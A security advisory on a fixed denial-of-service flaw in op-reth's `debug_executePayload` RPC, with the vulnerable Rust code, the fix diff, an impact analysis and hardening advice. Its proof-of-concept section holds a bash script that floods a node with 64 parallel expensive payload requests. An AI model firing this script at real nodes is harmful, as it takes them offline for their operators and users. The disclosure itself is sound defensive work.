# op-reth: `debug_executePayload` ran full block building synchronously on the RPC runtime with no concurrency limit, letting remote callers DoS the node

| Field | Value |
|---|---|
| **Target** | op-reth: `rpc/src/witness.rs` (`OpDebugWitnessApi::execute_payload`) and `node/src/node.rs`. Today these live at `rust/op-reth/crates/rpc/src/witness.rs` and `rust/op-reth/crates/node` |
| **Asset type** | Blockchain/DLT |
| **Severity** | Low |
| **Impact category** | "Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours". Downgraded to Low because this is a DoS of individual nodes that is only reachable when the operator exposes the non-default `debug` namespace |
| **Fix commit(s)** | `b93eb035e03c35c697b0434cf9481403583f7208` (paradigmxyz/reth#12998), 2024-12-05 |
| **Vulnerable since** | `6f651978ae` (paradigmxyz/reth#12583, 2024-11-15) added the API, and `99bb78d32a` (paradigmxyz/reth#12622, 2024-11-18) installed it on the node. That is about 17 days of exposure |

## Brief / Intro

op-reth adds an RPC method, `debug_executePayload(parentHash, payloadAttributes)`, for fault-proof tooling (kona / Asterisc). Given a parent block and a set of transactions, it builds a whole block and records every piece of state it touched (an "execution witness"). That is as expensive as producing a block. The method was registered as a plain synchronous handler, so each call occupied one of the node's async runtime worker threads until it finished, and nothing limited how many calls could run at once. Anyone who could reach the node's `debug` RPC could send a burst of heavy requests and starve the runtime. The runtime also serves the Engine API that op-node uses to drive the node, so the node would stop following the chain.

## Vulnerability Details

`b93eb035^:rpc/src/witness.rs:45-65`:
```rust
impl<Provider, EvmConfig> DebugExecutionWitnessApiServer<OpPayloadAttributes>
    for OpDebugWitnessApi<Provider, EvmConfig>
{
    fn execute_payload(                       // synchronous jsonrpsee method
        &self,
        parent_block_hash: B256,
        attributes: OpPayloadAttributes,      // fully caller-controlled
    ) -> RpcResult<ExecutionWitness> {
        let parent_header = self.parent_header(parent_block_hash).to_rpc_result()?;
        self.inner
            .builder
            .payload_witness(&self.inner.provider, parent_header, attributes)   // builds a block + witness inline
            .map_err(|err| internal_rpc_err(err.to_string()))
    }
}
```
`OpPayloadBuilder::payload_witness` (`b93eb035^:payload/src/builder.rs:183-219`) opens a state provider at the parent and executes every transaction in `attributes.transactions` (signed transactions *and* unsigned deposit transactions, which can carry arbitrary gas and mint). It then records a full witness. The caller also chooses `attributes.gas_limit`.

Root causes:
1. **Blocking work on async workers.** jsonrpsee runs synchronous method handlers inline on the connection's tokio task. A long block execution therefore blocks a runtime worker thread.
2. **No concurrency bound.** Nothing limited in-flight `execute_payload` calls. N parallel requests could block all tokio workers at once, which also stalls other jsonrpsee servers and tasks on the same runtime, including the authenticated Engine API.
3. **Caller-chosen cost.** Arbitrary transactions (including deposits that need no funded sender) and an arbitrary gas limit make each request as expensive as the attacker wants, up to a full block of worst-case EVM work plus witness collection.

Fix (`b93eb035`): moves execution to the blocking pool and bounds concurrency to 3:
```rust
-    fn execute_payload(
+    async fn execute_payload(
         &self, parent_block_hash: B256, attributes: OpPayloadAttributes,
     ) -> RpcResult<ExecutionWitness> {
+        let _permit = self.inner.semaphore.acquire().await;
         let parent_header = self.parent_header(parent_block_hash).to_rpc_result()?;
-        self.inner.builder.payload_witness(&self.inner.provider, parent_header, attributes)
+        let (tx, rx) = oneshot::channel();
+        let this = self.clone();
+        self.inner.task_spawner.spawn_blocking(Box::pin(async move {
+            let res = this.inner.builder.payload_witness(&this.inner.provider, parent_header, attributes);
+            let _ = tx.send(res);
+        }));
+        rx.await.map_err(|err| internal_rpc_err(err.to_string()))?
             .map_err(|err| internal_rpc_err(err.to_string()))
     }
...
+        let semaphore = Arc::new(Semaphore::new(3));
```

### Attack scenario

1. An operator runs op-reth with `--http.api debug,...` (or `--ws.api debug`) reachable from the internet, for example to serve fault-proof hosts.
2. The attacker sends many concurrent `debug_executePayload` calls. Each uses the latest block hash as parent, a large `gasLimit`, and deposit transactions that run a gas-heavy loop contract (deposits need no signature or balance).
3. Every call pins a tokio worker for the length of a full block execution plus witness generation. With as many calls as worker threads, the runtime stops scheduling other work. Engine API calls from op-node time out, gossip and sync tasks stall, and the node falls behind or appears down.

## Impact Details

- **Affected:** op-reth nodes that expose the `debug` namespace publicly. reth's default HTTP modules do not include `debug`, and operators usually restrict it, so the exposed population is small.
- **Effect:** temporary unavailability of that node (RPC plus Engine API starvation) while the attack continues. No consensus or state impact, and no funds at risk.
- **Window:** about 17 days (installed 2024-11-18, fixed 2024-12-05).
- **Residual after the fix:** the semaphore caps concurrency at 3 and moves work off the async workers, so the runtime is protected. Per-request cost is still caller-controlled, though, and three long-running witness builds can still use CPU and memory. Operators should still not expose `debug` publicly.
- **Severity:** Low. This is a single-node DoS behind a non-default, operator-controlled configuration.

## Proof of Concept

No regression test was added. Reproduction against a devnet op-reth built from the parent commit, started with `--http --http.api eth,debug`:

```bash
# 1. Deploy a gas-burning contract on L2 (e.g. `fallback() external { while (gasleft() > 5000) {} }`)
#    and note its address as $BURN. Take the latest block hash as parent.
PARENT=$(cast block latest -r $RPC --field hash)
TS=$(( $(cast block latest -r $RPC --field timestamp) + 2 ))

# 2. Build one payload request with an enormous gas limit and a deposit tx (type 0x7e) that calls $BURN
#    with a large gas limit. DEPOSIT_RLP can be produced with op-alloy / `cast` (a deposit needs no signature).
cat > req.json <<EOF
{"jsonrpc":"2.0","id":1,"method":"debug_executePayload","params":["$PARENT",{
  "timestamp":"$(printf '0x%x' $TS)","prevRandao":"0x00...00","suggestedFeeRecipient":"0x00...00",
  "withdrawals":[],"parentBeaconBlockRoot":"0x00...00",
  "transactions":["$DEPOSIT_RLP"],"noTxPool":true,"gasLimit":"0x3b9aca00",
  "eip1559Params":"0x0000000000000000"}]}
EOF

# 3. Fire N >= number of tokio worker threads (≈ CPU cores) in parallel and watch the engine API.
for i in $(seq 1 64); do curl -s -XPOST -H 'content-type: application/json' --data @req.json $RPC >/dev/null & done
time cast rpc eth_blockNumber -r $RPC        # parent commit: stalls / times out while the burst runs
# op-node logs show engine_forkchoiceUpdated / newPayload timeouts on the parent commit.
```
On the fix commit, at most three calls run at a time on blocking threads. `eth_blockNumber` and the Engine API stay responsive.

Executed: no. This needs a running devnet with the historical op-reth build. The analysis is from reading the parent-commit code.

## Recommendation

The fix (blocking-pool execution plus `Semaphore::new(3)`) removes runtime starvation. Further hardening:
- Bound per-request work: cap `attributes.gas_limit` at the chain's configured limit, and reject deposit transactions with gas above it.
- Add a wall-clock timeout or cancellation to `payload_witness`.
- Document that `debug` must not be exposed publicly, or put expensive debug methods behind a separate, authenticated module.

## References

- Fix commit: `b93eb035e03c35c697b0434cf9481403583f7208`
- Pull request: https://github.com/paradigmxyz/reth/pull/12998
- Introduced by: https://github.com/paradigmxyz/reth/pull/12583, https://github.com/paradigmxyz/reth/pull/12622
- Relevant files: `rpc/src/witness.rs`, `node/src/node.rs`, `payload/src/builder.rs` (now `rust/op-reth/crates/{rpc,node,payload}`)
